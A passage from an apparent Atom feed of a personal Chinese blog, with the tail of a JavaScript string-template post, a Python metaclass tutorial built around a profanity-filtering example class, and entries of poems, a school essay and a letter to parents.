class="params">word, slash1, token, slash2</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (slash1 || slash2) &#123;  </span><br><span class="line">            <span class="keyword">return</span> word.replace(<span class="string">'\\'</span>, <span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> variables = token.replace(<span class="regexp">/\s/g</span>, <span class="string">''</span>).split(<span class="string">'.'</span>);</span><br><span class="line">        <span class="keyword">var</span> currentObject = context;</span><br><span class="line">        <span class="keyword">var</span> i, length, variable;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>, length = variables.length; i &lt; length; ++i) &#123;</span><br><span class="line">            variable = variables[i];</span><br><span class="line">            currentObject = currentObject[variable];</span><br><span class="line">            <span class="keyword">if</span> (currentObject === <span class="literal">undefined</span> || currentObject === <span class="literal">null</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> currentObject;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除去空白行，一共 17 行。</p>
<h2 id="将函数挂到_String_的原型链">将函数挂到 String 的原型链</h2><p>甚至，我们可以通过修改原型链，实现一些很酷的效果：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.render = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> render(<span class="keyword">this</span>, context);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>之后，我们便可以这样调用啦：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;greeting&#125;! My name is &#123; author.name &#125;."</span>.render(&#123;</span><br><span class="line">    greeting: <span class="string">"Hi"</span>,</span><br><span class="line">    author: &#123;</span><br><span class="line">        name: <span class="string">"hsfzxjy"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Hi! My name is hsfzxjy.</span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>这是源于两年前，当我在做人生中第一个真正意义上的网站时遇到的一个问题</p>
<p>该网站采用前后端分离的方式，由后端的 REST 接口返回 JSON 数据，再由前端渲染到页面上。</p>
<p>同许多初学 Javascript 的菜鸟一样，起初，我也是采用拼接字符串的形式，将 JSON 数据嵌入 HTML 中。开始时代码量较少，暂时还可以接受。但当页面结构复杂起来后，其弱点开始变得无法忍受起来：</p>
<ul>
<li><strong>书写不连贯</strong>。每写一个变量就要断一下，插入一个 <code>+</code> 和 <code>&quot;</code>。十分容易出错。</li>
<li><strong>无法重用</strong>。HTML 片段都是离散化的数据，难以对其中重复的部分进行提取。</li>
<li><strong>无法很好地利用 <code>&lt;template&gt;</code> 标签</strong>。这是 HTML5 中新增的一个标签，标准极力推荐将 HTML 模板放入 <code>&lt;template&gt;</code> 标签中，使代码更简洁。</li>
</ul>
<p>当时我的心情就是这样的：</p>
<p><img src="http://i6.hexunimg.cn/2012-05-09/141219425.jpg" alt=""></p>
<p>为了解决这个问题，我暂时放下了手上的项目，花了半个小时实现一个极简易的字符串模板。</p>]]>
    
    </summary>
    
      <category term="DIY" scheme="http://hsfzxjy.github.io/tags/DIY/"/>
    
      <category term="javascript" scheme="http://hsfzxjy.github.io/tags/javascript/"/>
    
      <category term="字符串模板" scheme="http://hsfzxjy.github.io/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A8%A1%E6%9D%BF/"/>
    
      <category term="正则表达式" scheme="http://hsfzxjy.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python “黑魔法” 之 Meta Classes]]></title>
    <link href="http://hsfzxjy.github.io//meta-class-in-python/"/>
    <id>http://hsfzxjy.github.io//meta-class-in-python/</id>
    <published>2016-02-09T16:00:00.000Z</published>
    <updated>2016-02-10T14:45:13.631Z</updated>
    <content type="html"><![CDATA[<p>接触过 Django 的同学都应该十分熟悉它的 ORM 系统。对于 python 新手而言，这是一项几乎可以被称作“黑科技”的特性：只要你在<code>models.py</code>中随便定义一个<code>Model</code>的子类，Django 便可以：</p>
<ul>
<li>获取它的字段定义，并转换成表结构</li>
<li>读取<code>Meta</code>内部类，并转化成相应的配置信息。对于特殊的<code>Model</code>（如<code>abstract</code>、<code>proxy</code>），还要进行相应的转换</li>
<li>为没有定义<code>objects</code>的<code>Model</code>加上一个默认的<code>Manager</code></li>
</ul>
<p>开发之余，我也曾脑补过其背后的原理。曾经，我认为是这样的：</p>
<blockquote>
<p>启动时，遍历<code>models.py</code>中的所有属性，找到<code>Model</code>的子类，并对其进行上述的修改。</p>
</blockquote>
<p>当初，我还以为自己触碰到了真理，并曾将其应用到实际生产中——为 SAE 的 KVDB 写了一个类 ORM 系统。然而在实现的过程中，我明显感受到了这种方法的丑陋，而且性能并不出色（因为要遍历所有的定义模块）。</p>
<p>那么事实上，Django 是怎么实现的呢？</p>
<blockquote>
<p>自古以来我们制造东西的方法都是“自上而下”的，是用切削、分割、组合的方法来制造。然而，生命是自下而上地，自发地建造起来的，这个过程极为低廉。<br><cite>——王晋康 《水星播种》</cite></p>
</blockquote>
<p>这句话揭示了生命的神奇所在：<strong>真正的生命都是由基本物质自发构成的，而非造物主流水线式的加工</strong>。</p>
<p>那么，如果 类 也有生命的话，对它自己的修饰就不应该由调用者来完成，而应该是<strong>自发的</strong>。</p>
<p>幸而，python 提供了造物主的接口——这便是 Meta Classes，或者称为“元类”。</p>
<a id="more"></a>
<h2 id="元类_是什么？">元类 是什么？</h2><p>简单说：元类就是<strong>类的类</strong>。</p>
<p>首先，要有一个概念：</p>
<h3 id="python_中，一切都是对象。">python 中，一切都是对象。</h3><p>没错，一切，包括 类 本身。</p>
<p>既然，类 是 对象，对象 是 类的实例，那么——类 也应该有 类 才对。</p>
<h3 id="类的类：type">类的类：type</h3><p>在 python 中，我们可以用<code>type</code>检测一个对象的类，如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> type(<span class="number">1</span>) <span class="comment"># &lt;type 'int'&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果对一个类操作呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> type(int) <span class="comment"># &lt;type 'type'&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> type(MyClass) <span class="comment"># &lt;type 'type'&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> type(type) <span class="comment"># &lt;type 'type'&gt;</span></span><br></pre></td></tr></table></figure>
<p>这说明：<code>type</code>其实是一个类型，所有类——包括<code>type</code>自己——的类都是<code>type</code>。</p>
<h3 id="type_简介">type 简介</h3><p>从 <a href="https://docs.python.org/2/library/functions.html#type" target="_blank" rel="external">官方文档</a> 中，我们可以知道：</p>
<ul>
<li>和 <code>dict</code> 类似，<code>type</code> 也是一个工厂构造函数，调用其将返回 一个<code>type</code>类型的实例（即 类）。</li>
<li><p><code>type</code> 有两个重载版本：</p>
<ul>
<li><code>type(object)</code>，即我们最常用的版本。</li>
<li><p><code>type(name, bases, dict)</code>，一个更强大的版本。通过指定 类名称（<code>name</code>）、父类列表（<code>bases</code>）和 属性字典（<code>dict</code>） 动态合成一个类。</p>
<p>下面两个语句等价：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Integer</span><span class="params">(int)</span>:</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">'my integer'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increase</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------</span></span><br><span class="line"></span><br><span class="line">Integer = type(<span class="string">'Integer'</span>, (int, ), &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'my integer'</span>,</span><br><span class="line">    <span class="string">'increase'</span>: <span class="keyword">lambda</span> self, num: \</span><br><span class="line">                    num + <span class="number">1</span>    <span class="comment"># 很酷的写法，不是么</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>也就是说：<strong>类的定义过程，其实是<code>type</code>类型实例化的过程</strong>。</p>
<p><strong>然而这和修饰一个已定义的类有什么关系呢？</strong></p>
<p>当然有啦～既然“类的定义”就是“<code>type</code>类型的初始化过程”，那其中必定会调用到<code>type</code>的构造函数(<code>__new__()</code> 或 <code>__init__()</code>)。只要我们继承 <code>type</code>类 并修改其 <code>__new__</code>函数，在这里面动手脚就可以啦。</p>
<p>接下来我们将通过一个栗子感受 python 的黑魔法，不过在此之前，我们要先了解一个语法糖。</p>
<h3 id="__metaclass___属性">__metaclass__ 属性</h3><p>有没觉得上面第二段示例有些鬼畜呢？它勒令程序员将类的成员写成一个字典，简直是反人类。如果我们真的是要通过修改 元类 来改变 类 的行为的话，似乎就必须采用这种方法了～～简直可怕～～</p>
<p>好在，<a href="https://docs.python.org/2/reference/datamodel.html?#__metaclass__" target="_blank" rel="external">python 2.2</a> 时引进了一个语法糖：<code>__metaclass__</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Integer</span><span class="params">(int)</span>:</span></span><br><span class="line"></span><br><span class="line">    __metaclass__ = IntMeta</span><br></pre></td></tr></table></figure>
<p>现在将会等价于：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer = IntMeta(<span class="string">'Integer'</span>, (int, ), &#123;&#125;)</span><br></pre></td></tr></table></figure>
<p>由此一来，我们在使用传统类定义的同时，也可以使用元类啦。</p>
<h2 id="栗子：子类净化器">栗子：子类净化器</h2><blockquote>
<h4 id="需求描述">需求描述</h4><p>你是一个有语言洁癖的开发者，平时容不得别人讲一句脏话，在开发时也是如此。现在，你写出了一个非常棒的框架，并马上要将它公之于众了。不过，你的强迫症又犯了：如果你的使用者在代码中写满了脏话，怎么办？岂不是玷污了自己的纯洁？</p>
</blockquote>
<p>假如你就是这个丧心病狂的开发者，你会怎么做？</p>
<p>在知道元类之前，你可能会无从下手。不过，这个问题你可以用 元类 轻松解决——只要在类定义时过滤掉不干净的字眼就好了（百度贴吧的干活～～）。</p>
<p>我们的元类看起来会是这样的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sensitive_words_list = [<span class="string">'asshole'</span>, <span class="string">'fuck'</span>, <span class="string">'shit'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect_sensitive_words</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">'''检测敏感词汇'''</span></span><br><span class="line">    words_detected = filter(<span class="keyword">lambda</span> word: word <span class="keyword">in</span> string.lower(), sensitive_words_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> words_detected:</span><br><span class="line">        <span class="keyword">raise</span> NameError(<span class="string">'Sensitive words &#123;0&#125; detected in the string "&#123;1&#125;".'</span> \</span><br><span class="line">            .format(</span><br><span class="line">                <span class="string">', '</span>.join(map(<span class="keyword">lambda</span> s: <span class="string">'"%s"'</span> % s, words_detected)),</span><br><span class="line">                string</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CleanerMeta</span><span class="params">(type)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, class_name, bases, attrs)</span>:</span></span><br><span class="line">        detect_sensitive_words(class_name) <span class="comment"># 检查类名</span></span><br><span class="line">        map(detect_sensitive_words, attrs.iterkeys()) <span class="comment"># 检查属性名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Well done! You are a polite coder!"</span> <span class="comment"># 如无异常，输出祝贺消息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> super(CleanerMeta, cls).__new__(cls, class_name, bases, attrs)</span><br><span class="line">        <span class="comment"># 重要！这行一定不能漏！！这回调用内建的类构造器来构造类，否则定义好的类将会变成 None</span></span><br></pre></td></tr></table></figure>
<p>现在，只需这样定义基类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIBase</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    __metaclass__ = CleanerMeta</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<p>那么所有 <code>APIBase</code> 的派生类都会接受安全审查（奸笑～～）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImAGoodBoy</span><span class="params">(APIBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    a_polite_attribute = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output] Well done! You are a polite coder!</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FuckMyBoss</span><span class="params">(APIBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output] NameError: Sensitive words "fuck" detected in the string "FuckMyBoss".</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PretendToBePolite</span><span class="params">(APIBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__fuck_your_asshole</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output] NameError: Sensitive words "asshole", "fuck" detected in the string "_PretendToBePolite__fuck_your_asshole".</span></span><br></pre></td></tr></table></figure>
<p>看，即使像最后一个例子中的私有属性也难逃审查，因为它们本质都是相同的。</p>
<p>甚至，你还可以对有问题的属性进行偷偷的修改，比如 让不文明的函数在调用时打出一行警告 等等，这里就不多说了。</p>
<h2 id="元类_在实际开发中的应用">元类 在实际开发中的应用</h2><p>日常开发时，元类 常用吗？</p>
<p>当然，Django 的 ORM 就是一个例子，大名鼎鼎的 SQLAlchemy 也用了这种黑魔法。</p>
<p>此外，在一些小型的库中，也有 元类 的身影。比如 <code>abc</code>（奇怪的名字～～）——这是 python 的一个内建库，用于模拟 抽象基类（Abstract Base Classes）。开发者可以使用 <code>abc.abstractmethod</code> 装饰器，将 指定了 <code>__metaclass__ = abc.ABCMeta</code> 的类的方法定义成 抽象方法，同时这个类也成了 抽象基类，抽象基类是不可实例化的。这便实现了对 抽象基类 的模拟。</p>
<p>倘若你也有需要动态修改类定义的需求，不妨也试试这种“黑魔法”。</p>
<h2 id="小结">小结</h2><ul>
<li>类 也是 对象，所有的类都是<code>type</code>的实例</li>
<li>元类（Meta Classes）是类的类</li>
<li><code>__metaclass__ = Meta</code> 是 <code>Meta(name, bases, dict)</code> 的 语法糖</li>
<li>可以通过重载元类的 <code>__new__</code> 方法，修改 类定义 的行为</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>接触过 Django 的同学都应该十分熟悉它的 ORM 系统。对于 python 新手而言，这是一项几乎可以被称作“黑科技”的特性：只要你在<code>models.py</code>中随便定义一个<code>Model</code>的子类，Django 便可以：</p>
<ul>
<li>获取它的字段定义，并转换成表结构</li>
<li>读取<code>Meta</code>内部类，并转化成相应的配置信息。对于特殊的<code>Model</code>（如<code>abstract</code>、<code>proxy</code>），还要进行相应的转换</li>
<li>为没有定义<code>objects</code>的<code>Model</code>加上一个默认的<code>Manager</code></li>
</ul>
<p>开发之余，我也曾脑补过其背后的原理。曾经，我认为是这样的：</p>
<blockquote>
<p>启动时，遍历<code>models.py</code>中的所有属性，找到<code>Model</code>的子类，并对其进行上述的修改。</p>
</blockquote>
<p>当初，我还以为自己触碰到了真理，并曾将其应用到实际生产中——为 SAE 的 KVDB 写了一个类 ORM 系统。然而在实现的过程中，我明显感受到了这种方法的丑陋，而且性能并不出色（因为要遍历所有的定义模块）。</p>
<p>那么事实上，Django 是怎么实现的呢？</p>
<blockquote>
<p>自古以来我们制造东西的方法都是“自上而下”的，是用切削、分割、组合的方法来制造。然而，生命是自下而上地，自发地建造起来的，这个过程极为低廉。<br><cite>——王晋康 《水星播种》</cite></p>
</blockquote>
<p>这句话揭示了生命的神奇所在：<strong>真正的生命都是由基本物质自发构成的，而非造物主流水线式的加工</strong>。</p>
<p>那么，如果 类 也有生命的话，对它自己的修饰就不应该由调用者来完成，而应该是<strong>自发的</strong>。</p>
<p>幸而，python 提供了造物主的接口——这便是 Meta Classes，或者称为“元类”。</p>]]>
    
    </summary>
    
      <category term="Meta Classes" scheme="http://hsfzxjy.github.io/tags/Meta-Classes/"/>
    
      <category term="python" scheme="http://hsfzxjy.github.io/tags/python/"/>
    
      <category term="元编程" scheme="http://hsfzxjy.github.io/tags/%E5%85%83%E7%BC%96%E7%A8%8B/"/>
    
      <category term="黑魔法" scheme="http://hsfzxjy.github.io/tags/%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[诗集]]></title>
    <link href="http://hsfzxjy.github.io//poems/"/>
    <id>http://hsfzxjy.github.io//poems/</id>
    <published>2015-11-30T16:00:00.000Z</published>
    <updated>2015-12-19T12:52:31.126Z</updated>
    <content type="html"><![CDATA[<h3 id="2015-11-04">2015-11-04</h3><p>第 -206 天</p>
<p>曾经的不屑</p>
<p>早已如烟</p>
<p>曾经不屑的</p>
<p>却又沉淀</p>
<h3 id="2015-11-24">2015-11-24</h3><p>当能力成为本能 恰似鱼儿潜入水中</p>
<p>你问 何以会凫水？</p>
<p>鱼答 我也不知道</p>
<p>:-(</p>
<h3 id="2015-11-26">2015-11-26</h3><p>一夜的寒冷 仿佛击碎了文明</p>
<p>在黎明的迷雾中 人们聚集于旷野</p>
<p>向东方的鱼肚白祈祷 渴求着光与热</p>
<p>目光 狂热而虔诚</p>
<p>就像 他们的祖先一样</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="2015-11-04">2015-11-04</h3><p>第 -206 天</p>
<p>曾经的不屑</p>
<p>早已如烟</p>
<p>曾经不屑的</p>
<p>却又沉淀</p>
<h3 id="2015-11-24">2015-11-24</h3><p>当]]>
    </summary>
    
      <category term="诗" scheme="http://hsfzxjy.github.io/tags/%E8%AF%97/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[生活，需要被“发现”]]></title>
    <link href="http://hsfzxjy.github.io//life-needs-discovery/"/>
    <id>http://hsfzxjy.github.io//life-needs-discovery/</id>
    <published>2015-11-27T16:00:00.000Z</published>
    <updated>2015-11-28T14:17:54.511Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>40 分钟赶完的作文，没想到居然成了范文。 <strong>Scores：47</strong></p>
</blockquote>
<p>互联网，从当初的雨后春笋发展成为了我们生活中必不可缺的一部分——二十年，有如白驹过隙，但就是在如此短的时间中，世界已完全被网络颠覆了。</p>
<a id="more"></a>
<p>网络，在方便了人们衣食住行的同时，也在悄悄地改变着人们的生活方式。外出吃饭，不必再为饭店的选择而头疼。打开搜索，指尖滑动，一份详细的选择清单即可为我们呈现；外出远足，不必再为出行路线担忧。打开搜索，鼠标轻点，立刻可以获得网友们的“独家推荐”。身处信息时代，我们变得无所不知，在包罗万象的网络的引导下，过去的许多问题都会迎刃而解。然而——</p>
<p>在这个时代，我们似乎失去了什么。</p>
<p>足不出户即可知天下。网络中，世界变小了。但在巨量信息的冲击下，我们却愈发地感到生活的乏味。其中的原因便是：“发现”的乐趣正在流失。</p>
<p>过去，当世界尚未联网时。在工作之余漫步于大街小巷，偶遇一家未曾谋面的饭店你会感到惊喜。仔细品尝其中的美味，或咸或淡，皆源于自己的感受。那一刻的感受，好比发现了新大陆般令人愉悦。</p>
<p>曾经，当世界尚未联网时。在假日慕名拜访一座名山。没有指引，没有推荐，完全凭着感觉走。偶然踏出一条小路，通向一片未知的天地。当你站在奇山异水前，那种快感，只有亲身经历的人才能体会。</p>
<p>犹记得，有这样一个田园时代，人们甚至还不知道地球是圆的。那时，一山一水，都是一个世界。男耕女织，养蚕植桑。不时，在小世界中来一次探索，用双腿踏出一条路，用双眼去发现。一旦发现一处未知的角隅，便有如开拓了一片新天地——事实上，世界的拓荒，便是在人们不断的“发现”中完成的。</p>
<p>生活需要被“发现”。”发现“引导着我们探索新领域，而在这个过程中，我们会收获”发现“的乐趣。</p>
<p>只可惜，网络时代的到来，将我们淹没在了信息的洋流中。在变得全知全能的同时，我们却失去了”发现“的动力。生活，自然也变得乏味了起来。</p>
<p>因此，不妨偶尔离开网络，尝试去探索自己未知的领域，在”发现“的同时，拾回遗失已久的乐趣。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>40 分钟赶完的作文，没想到居然成了范文。 <strong>Scores：47</strong></p>
</blockquote>
<p>互联网，从当初的雨后春笋发展成为了我们生活中必不可缺的一部分——二十年，有如白驹过隙，但就是在如此短的时间中，世界已完全被网络颠覆了。</p>]]>
    
    </summary>
    
      <category term="作文" scheme="http://hsfzxjy.github.io/tags/%E4%BD%9C%E6%96%87/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/tags/%E6%9D%82%E6%84%9F/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[家书·十八岁成人礼]]></title>
    <link href="http://hsfzxjy.github.io//letter-to-parents/"/>
    <id>http://hsfzxjy.github.io//letter-to-parents/</id>
    <published>2015-10-17T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.145Z</updated>
    <content type="html"><![CDATA[<p>事实上，截至目前，我只有十七岁，但无论年龄的多与少，今天这个特殊的日子，都有着其特殊的意义——是的，我要成人了。</p>
<p>这里，我想先说一声谢谢。</p>
<a id="more"></a>
<p>这两个字，一部分是对你们养育之恩的感谢。十七年的光阴，在我看来，有如白驹过隙——还未来得及怀着童心去触遍整个世界，世界奇幻的一面却已开始变得乏味。但对你们而言，我想，一定挺漫长的吧。这种体验，我没有经历过，因此我不妄下评论。但我终有一天会体味到，到了那时，或许，我也会有像你们一样的感慨。</p>
<p>这两个字，还有一部分，是为了感谢你们这么多年来对我默默的支持——这是精神层面的。<strong>做自己喜欢的事</strong>——这是你们常对我说的一句话。正因为有了这句话，才有了我今天在奥数方面的成绩——曾经，我喜欢数学，并一直坚持了下来。和许多同学相比，我觉得我很幸运。这份来自家庭的信任，我会好好珍惜的。</p>
<p>成人了，在人生轨道与时间轴交错的节点上，除了望向身后尚未远离的原点，我也想谈谈箭头所指的那边，那未知的前方。</p>
<p>对于未来，人在其一生中会有许多的想法——很奇怪，但也尽在情理之中——毕竟，未来的变数对想法的影响，是不可预测的，也是不可观测的。曾记得小时候，有段时间我很想当一名隐士——这是受了陶渊明的影响。在现在看来，这有些可笑，毕竟陶是为了避官场而遁世，而我却没有什么正当的理由，仿佛，就是为了隐居而隐居。更何况，这么多年来，我发现世上还是有好些东西是有趣的。凭此，隐居不值得我去尝试。</p>
<p>此后，随着世事变迁，我又相继有了些其他的想法。其中的每一个，在当时看来，都是自己绝妙的归宿。直到有一天，回首这一连串的想法，我发现了两个规律：其一是<strong>递变性</strong>，对未来的遐想渐渐不再天马行空，而是向现实靠近——这很自然，因为现实是有引力的，生命的第一要义是生存，在生存之上谈生活才有意义；其二是<strong>相对稳定性</strong>，即 在任何时候，我都希望，我能做，我喜欢做的事情。</p>
<p>于是，我认为，生活的意义，在于能做自己喜欢的事情——这也恰是你们常说的。于是，在高中伊始时，我开始做网站——这是现阶段我所喜欢的。无论是否有意义，总而言之，高中这两年我过得很快乐。而且在这过程中，我见识到了自己的工程构建能力和自学能力——顺便说说，这两年乃至可预见的将来，无论遭遇什么，我都不会患得患失，我的淡定即来源于此。因为就算有一天，生活退化成生存，只要有一定的资源，这些能力足以支撑我走下去——而我要的资源，到处都是。因此对于我，未来是未知的，但不会迷惘。</p>
<p>但从你们的眼中，我读出了担忧——毕竟在你们看来，我没有在干“正事”。我感到不耐烦，因为我不想背离初心；但我又感到犹豫，因为我不想伤到最亲近的人。这时的我，忽然想起了庄子的《逍遥游》，想起其论述的“万物皆有所凭借”的观点。的确，天高任鸟飞，但真要跃上云霄，还得看风的脸色。于是乎，在我的“准则”前，又多了一个条件：<strong>在理智的亲人不极力反对的情况下</strong>。</p>
<p>注意到，这个条件中也隐含了许多条件：毕竟，亲人，也是现实引力的一部分，是世俗的一部分。我害怕变得世俗，怕得要死，身边有太多这样的例子，同是有独立思想的少年，因现实巨大的引力坠入世俗，拼学历搏虚名，混职场谋高位，贷车贷房娶妻生娃，由此碌碌终生。一代又一代，遗传了重复的命，如俄罗斯套娃般相似得悚然，令人窒息。诚然，有些人是由于客观条件的不允许，现实引力过大，以致尚未起飞便就地湮灭，这种人是可怜的。但更多的则是由于他们某些未开化的亲人。但对于我，客观条件是允许的，因此我希望，主观条件不会构成巨大的引力，将我困于史瓦斯半径中，使我化为尘土。</p>
<p>陈奕迅曾有一首《任我行》，听得我潸然泪下（陈奕迅有许多粤语歌都值得细细品味，尤其是林夕作词的，推荐你们听）。事实上，我只是歌首那位“半夜离队上山”的顽童。但有一天，曾渴望品尝真正自由的我，却会开始“忌讳空山无人”，突然“害怕遥望星辰”。神仙鱼横渡大海会断魂，而人在空山中亦会无处求生——到头来，还得随着大队走，没入有如羊群的人群中。</p>
<p>我没有经历过，因而无法透析其中的原因，但从这首歌，我窥见了可能的未来。我不知自己何时会因现实引力落地，也许是三十岁，也许是四十岁，兴许是五十岁。但我知道，一旦轰然坠地，便难以再腾飞——除非在暮年，我又成为了一位顽童——但这需要精力，更需要勇气。因此我希望，在坠地后，我的回忆能与别人有些不同——最好，就是能像自己想的那样。迟暮之时，能够坐在黄昏中，眯眼望向残阳，任晚风吹拂脸庞，一遍遍地嗅着回忆，一次次咀嚼着曾经。我想，此生此行，亦就无憾了。</p>
<p>我想普通地做人，但不想做一个普通人。</p>
<p>就算终要回归羊群，我也要做一只有不同经历的羊。</p>
<p>所以，在未来，我会照着自己的兴趣做事，也许会做一些你们完全无法理解的事——我不求你们理解，毕竟我们相隔三十年。同时，我也欢迎你们来批评我，劝阻我，我会尊重你们的意见—。但有一点，一定要理性——无论是你们，还是我。</p>
<p>我想，这就是我要的未来。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>事实上，截至目前，我只有十七岁，但无论年龄的多与少，今天这个特殊的日子，都有着其特殊的意义——是的，我要成人了。</p>
<p>这里，我想先说一声谢谢。</p>]]>
    
    </summary>
    
      <category term="家书" scheme="http://hsfzxjy.github.io/tags/%E5%AE%B6%E4%B9%A6/"/>
    
